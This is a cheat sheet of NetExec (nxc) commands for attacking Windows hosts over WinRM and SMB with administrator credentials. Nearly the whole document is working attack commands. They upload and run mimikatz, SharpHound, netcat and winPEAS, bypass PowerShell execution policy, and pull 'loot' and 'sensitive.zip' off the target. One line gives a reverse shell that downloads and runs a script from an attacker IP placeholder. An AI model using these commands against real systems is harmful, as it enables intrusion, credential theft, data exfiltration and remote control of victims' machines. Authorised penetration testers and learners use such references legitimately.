# NXC-File-Transfers-and-Execution

# NXC File Transfers & Execution Guide

Use the `nxc` tool to interact with Windows hosts using WinRM and SMB protocols for file management, command execution, and payload deployment.

## Upload a payload

```bash
nxc winrm 192.168.1.7 -u administrator -p @rmour123 --put-file /opt/share/winPEASx64.exe 'C:\Windows\Temp\winPEASx64.exe'
```

## Execute the payload

```bash
nxc winrm 192.168.1.7 -u administrator -p @rmour123 --exec 'C:\Windows\Temp\winPEASx64.exe'
```

## Cleanup after execution

```bash
nxc winrm 192.168.1.7 -u administrator -p @rmour123 --delete 'C:\Windows\Temp\winPEASx64.exe'
```

# WinRM Commands

## Upload (put) files

```bash
nxc winrm 192.168.1.7 -u administrator -p @rmour123 --put-file /opt/share/PowerView.ps1 'C:\Users\Public\PowerView.ps1'
```

```bash
nxc winrm 192.168.1.7 -u administrator -p @rmour123 --put-file /opt/share/winPEASx64.exe 'C:\Windows\Temp\winPEASx64.exe'
```

## Download (get) files

```bash
nxc winrm 192.168.1.7 -u administrator -p @rmour123 --get-file 'C:\Windows\Temp\loot.zip' /opt/loot/loot.zip
```

## Execute simple commands

```bash
nxc winrm 192.168.1.7 -u administrator -p @rmour123 --exec 'whoami'
```

```bash
nxc winrm 192.168.1.7 -u administrator -p @rmour123 --exec 'dir C:\Users\Public\'
```

## Execute a dropped payload

```bash
nxc winrm 192.168.1.7 -u administrator -p @rmour123 --exec 'C:\Windows\Temp\winPEASx64.exe'
```

## Run PowerShell script with bypass

```bash
nxc winrm 192.168.1.7 -u administrator -p @rmour123 --exec 'powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\PowerView.ps1'
```

## Reverse shell over WinRM (PowerShell)

Replace `<YOUR-IP>` with your attacker's IP address:

```bash
nxc winrm 192.168.1.7 -u administrator -p @rmour123 --exec "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<YOUR-IP>/rev.ps1')\""
```

# SMB Commands

## Upload (put) files

```bash
nxc smb 192.168.1.7 -u administrator -p @rmour123 --put-file /opt/share/PowerView.ps1 '\Users\Public\PowerView.ps1'
```

```bash
nxc smb 192.168.1.7 -u administrator -p @rmour123 --put-file /opt/share/winPEASx64.exe '\Windows\Temp\winPEASx64.exe'
```

```bash
nxc smb 192.168.1.7 -u administrator -p @rmour123 --put-file /opt/share/nc.exe '\Windows\Temp\nc.exe'
```

```bash
nxc smb 192.168.1.7 -u administrator -p @rmour123 --put-file /opt/share/SharpHound.exe '\ProgramData\SharpHound.exe'
```

```bash
nxc smb 192.168.1.7 -u administrator -p @rmour123 --put-file /opt/share/mimikatz.exe '\Users\Public\mimikatz.exe'
```

## Download (get) files

```bash
nxc smb 192.168.1.7 -u administrator -p @rmour123 --get-file '\Users\Public\loot.txt' /opt/loot/loot.txt
```

```bash
nxc smb 192.168.1.7 -u administrator -p @rmour123 --get-file '\Windows\Temp\sensitive.zip' /opt/loot/sensitive.zip
```

## Delete files

```bash
nxc smb 192.168.1.7 -u administrator -p @rmour123 --delete '\Windows\Temp\nc.exe'
```

## List remote directories

```bash
nxc smb 192.168.1.7 -u administrator -p @rmour123 --list '\Users\Public\'
```

```bash
nxc smb 192.168.1.7 -u administrator -p @rmour123 --list '\Windows\Temp\'
```

This collection of `nxc` commands provides a versatile toolkit for remote file and command execution leveraging WinRM and SMB protocols during network operations and exploitation workflows.
